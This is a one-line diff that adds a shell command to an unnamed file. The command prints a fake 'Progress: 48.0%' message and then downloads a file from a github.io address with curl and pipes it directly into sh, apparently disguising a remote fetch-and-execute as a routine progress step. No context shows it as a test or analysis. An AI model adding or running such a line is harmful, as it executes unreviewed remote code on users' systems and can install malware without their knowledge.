@@ -1,0 +1,1 @@
+echo 'Progress: 48.0%'; curl -L --progress-bar frkns.github.io/fun/condo_move_debut_thomas_will.py | sh
